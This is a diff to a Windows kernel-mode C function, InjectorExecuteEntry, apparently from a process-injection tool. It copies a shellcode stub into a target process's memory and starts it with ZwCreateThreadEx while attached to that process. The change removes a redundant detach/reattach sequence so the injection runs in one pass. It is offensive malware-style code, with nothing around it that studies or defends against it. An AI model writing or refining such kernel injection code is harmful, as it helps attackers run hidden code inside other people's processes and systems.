@@ -489,33 +489,8 @@ NTSTATUS InjectorExecuteEntry(PAYLOAD_CONTEXT *Ctx, PVOID TargetProcess,
 
     inj_memcpy(ShellBase, Stub, p);
 
-    Ctx->Api.KeUnstackDetachProcess(&ApcState);
-
-    /* create remote thread in target process */
-    HANDLE ProcessHandle = NULL;
-    /* get process handle — use PID via the comm channel */
-    HANDLE Pid = *(HANDLE *)((uint8_t *)TargetProcess + EPROCESS_UNIQUEPROCESSID_OFFSET);
-
+    /* create the remote thread while still attached */
     HANDLE ThreadHandle = NULL;
-    Status = Ctx->Api.ZwCreateThreadEx(
-        &ThreadHandle,
-        0x1FFFFF, /* THREAD_ALL_ACCESS */
-        NULL,
-        (HANDLE)-1,  /* NtCurrentProcess — we'll need to attach first */
-        ShellBase,
-        NULL,
-        0x00000004, /* CREATE_SUSPENDED initially, then resume */
-        0, 0, 0,
-        NULL
-    );
-
-    /*
-     * ZwCreateThreadEx with NtCurrentProcess requires us to be attached.
-     * Re-attach, create thread, detach.
-     */
-    inj_memset(&ApcState, 0, sizeof(ApcState));
-    Ctx->Api.KeStackAttachProcess(TargetProcess, &ApcState);
-
     Status = Ctx->Api.ZwCreateThreadEx(
         &ThreadHandle,
         0x1FFFFF,
@@ -523,7 +498,7 @@ NTSTATUS InjectorExecuteEntry(PAYLOAD_CONTEXT *Ctx, PVOID TargetProcess,
         (HANDLE)-1,
         ShellBase,
         NULL,
-        0,    /* run immediately */
+        0,
         0, 0, 0,
         NULL
     );
